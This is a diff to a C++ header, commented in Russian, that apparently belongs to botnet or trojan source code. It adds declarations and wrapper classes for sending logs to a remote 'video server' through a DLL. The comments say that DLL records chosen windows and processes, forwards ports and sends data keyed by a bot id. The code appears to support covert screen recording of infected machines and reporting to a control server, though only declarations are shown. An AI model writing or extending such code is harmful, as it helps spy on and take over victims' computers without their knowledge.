@@ -44,6 +44,11 @@ private:
 
 	typedef VOID (WINAPI *TStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
 
+	//функции для передачи логов на сервер
+	typedef int  (WINAPI *TInitSendLog)( char* uid, const char* ip1, int port1, const char* ip2, int port2 );
+	typedef void (WINAPI *TReleaseSendLog)();
+	typedef void (WINAPI *TSendLog)( const char* name, int code, const char* text );
+
 	//проброс порта через видео сервер, uid - ид бота, ip:port - айпи адрес и порта видео сервера
 	//порт который нужно пробросить передает видео сервер. Функция создает отдельный поток, поэтому сразу
 	//завершает работу
@@ -55,12 +60,15 @@ public:
 	TVideoRecDLL();
 	~TVideoRecDLL();
 
-	TStartRecHwnd     RecordWnd;
-	TStartRecPid      RecordProcess;
-	TStopRec          Stop;
-	TResetTimer       ResetTimer;
-	TStartSend        SendData;
-	TRunPortForward   RunPortForward;
+	TStartRecHwnd		RecordWnd;
+	TStartRecPid		RecordProcess;
+	TStopRec			Stop;
+	TResetTimer			ResetTimer;
+	TStartSend			SendData;
+	TRunPortForward		RunPortForward;
+	TInitSendLog		InitSendLog;
+	TReleaseSendLog		ReleaseSendLog;
+	TSendLog			SendLog;
 };
 
 
@@ -94,6 +102,46 @@ public:
 };
 
 
+//Класс для отправки логов на видео-сервер
+class VideoSendLog : public TBotObject
+{
+		TVideoRecDLL dll;
+
+	public:
+
+		VideoSendLog();
+		~VideoSendLog();
+		//отправка лога на сервер:
+		//name - имя лога
+		//code - код лога
+		//format - форматированный текст лога
+		void Send( const char* name, int code, const char* format, ... );
+		void SendV( const char* name, int code, const char* format, va_list va );
+		//тоже самое что и Send только без форматирования текста
+		void Send2( const char* name, int code, const char* text )
+		{
+			dll.SendLog( name, code, text );
+		}
+};
+
+//класс для упрощения отправки логов, тут запоминается имя лога, чтобы не писать его в каждой строчке
+class VideoSendLogName : public TBotObject
+{
+		VideoSendLog& vsl;
+		const char* name;
+
+	public:
+
+		VideoSendLogName( VideoSendLog& _vsl, const char* _name ) : vsl(_vsl), name(_name)
+		{
+		}
+		void Send( int code, const char* format, ... );
+		void Send2(int code, const char* text )
+		{
+			vsl.Send2( name, code, text );
+		}
+
+};
 
 //Функция возвращает адрес сервера для записи видео
 PCHAR GetVideoRecHost1();
